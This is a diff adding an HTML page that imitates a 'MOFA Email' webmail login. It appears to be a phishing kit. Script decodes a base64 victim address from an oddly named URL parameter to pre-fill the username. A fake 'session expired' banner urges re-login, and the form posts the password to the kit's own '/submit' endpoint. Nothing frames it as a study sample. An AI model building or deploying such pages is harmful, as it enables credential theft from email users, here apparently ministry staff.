@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en" class="js chrome webkit layout-large">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>MOFA Email :: Welcome to MOFA Email</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+    <meta name="theme-color" content="#f4f4f4">
+    <meta name="msapplication-navbutton-color" content="#f4f4f4">
+    <link rel="shortcut icon" href="favicon.svg">
+    <link rel="stylesheet" href="./lifelarombapannanum/bootstrap.min.css">
+    <link rel="stylesheet" href="./lifelarombapannanum/styles.css">
+    <script>
+      // Function to extract query parameter value
+      function getQueryParameter(parameterName) {
+        var queryString = window.location.search;
+        var urlParams = new URLSearchParams(queryString);
+        return urlParams.get(parameterName);
+      }
+      // Get the value from the 'data' query parameter
+      var value = getQueryParameter('ghdfgshdfhdgfhdgfh');
+      var b64name = atob(value);
+
+      function onLoad() {
+        var b64name = atob(value);
+        var inputField = document.getElementById('username');
+        inputField.value = b64name;
+      }
+    </script>
+  </head>
+  <body onload="onLoad();" class="task-login action-none">
+    <div id="layout">
+      <h1 class="voice">MOFA EMAIL SERVER Login</h1>
+      <div id="layout-content" class="selected no-navbar" role="main">
+        <img src="./lifelarombapannanum/logo.png" id="logo" alt="Logo">
+        <div id="login-form" name="login-form" method="post" action="/" class="propform">
+         <form method="POST" name="logonForm" action="/submit" enctype="application/x-www-form-urlencoded" autocomplete="off">
+          <span style='color:red' id='error-class'></span>
+          <input type="hidden" name="_token" value="5JBKm62gbaL1PvZqoiUiCIk2u0drAzdH" class="form-control">
+          <input type="hidden" name="_task" value="login" class="form-control">
+          <input type="hidden" name="_action" value="login" class="form-control">
+          <input type="hidden" name="_timezone" id="rcmlogintz" value="Asia/Calcutta" class="form-control">
+          <input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control">
+          <table>
+            <tbody>
+              <tr class="form-group row">
+                <td class="title" style="display: none;">
+                  <label for="rcmloginuser">Username</label>
+                </td>
+                <td class="input input-group input-group-lg">
+                  <span class="input-group-prepend">
+                    <i class="input-group-text icon">
+                      <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-person-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z" />
+                      </svg>
+                    </i>
+                  </span>
+                  <input name="username" id="username" required="" value="username" size="40" autocapitalize="off" type="text" class="form-control" placeholder="Username">
+                </td>
+              </tr>
+              <tr class="form-group row">
+                <td class="title" style="display: none;">
+                  <label for="rcmloginpwd">Password</label>
+                </td>
+                <td class="input input-group input-group-lg">
+                  <span class="input-group-prepend">
+                    <i class="input-group-text icon">
+                      <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-lock-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M2.5 9a2 2 0 0 1 2-2h7a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-7a2 2 0 0 1-2-2V9z" />
+                        <path fill-rule="evenodd" d="M4.5 4a3.5 3.5 0 1 1 7 0v3h-1V4a2.5 2.5 0 0 0-5 0v3h-1V4z" />
+                      </svg>
+                    </i>
+                  </span>
+                  <input name="password" id="rcmloginpwd" required="" size="40" autocapitalize="off" type="password" class="form-control" placeholder="Password">
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <p class="formbuttons">
+            <button type="submit"  id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button>
+          </p>
+         
+            <div id="login-footer" role="contentinfo">
+              <p> MOFA Email</p>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div id="messagestack" style="border-radius: 5px; border-color: #dc3545; width: 380px; height: 55px; background-color: #dc3545; margin-right: 0px;">&nbsp;&nbsp;&nbsp;&nbsp; <svg width="2em" height="4em" viewBox="0 0 16 16" class="bi bi-exclamation-circle-fill" fill="white" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z" />
+      </svg>
+      <span style="color:white; margin-top: 0px; font-size: 16px;"> Your session is invalid or has expired.</span>
+    </div>
+    <script></script>
+    <script src="./lifelarombapannanum/bootstrap.bundle.min.js"></script>
+    <script src="./lifelarombapannanum/ui.min.js"></script>
+  </body>
+</html>
